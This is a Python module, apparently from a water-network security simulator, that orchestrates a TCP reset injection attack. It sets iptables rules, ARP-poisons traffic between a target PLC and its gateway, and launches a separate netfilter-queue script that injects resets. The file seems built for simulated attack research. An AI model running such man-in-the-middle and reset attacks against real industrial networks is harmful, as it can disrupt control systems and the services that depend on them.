import argparse
import subprocess
import sys
from pathlib import Path
from wacsim.network_attacks.mitm_attack import MiTMAttack

class TCPRSTAttack(MiTMAttack):
    """
    TCP Reset (RST) injection attack orchestrator. Overrides setup to spawn the
    tcp_rst_netfilter_queue.py subprocess.
    """
    def setup(self):
        self.modify_ip_tables(True)
        self.launch_mitm(get_macs=True)
        if self.intermediate_yaml['network_topology_type'] == "simple":
            import _thread
            self.run_thread = True
            _thread.start_new_thread(self.refresh_poison, (self.ARP_POISON_PERIOD, self.ARP_POISON_PERIOD))

        self.logger.debug(f"TCP RST Attack ARP Poison between {self.target_plc_ip} and "
                          f"{self.intermediate_attack['gateway_ip']}")

        queue_number = self.intermediate_attack['queue_num']
        nfqueue_path = Path(__file__).parent.absolute() / "tcp_rst_netfilter_queue.py"
        cmd = ["python3", str(nfqueue_path), str(self.intermediate_yaml_path), str(self.yaml_index), str(queue_number)]
        self.nfqueue_process = subprocess.Popen(cmd, shell=False, stderr=sys.stderr, stdout=sys.stdout)

def is_valid_file(parser_instance, arg):
    import os
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start TCP RST injection attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml",
                        type=int, metavar="N")
    args = parser.parse_args()

    attack = TCPRSTAttack(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index)
    attack.main_loop()
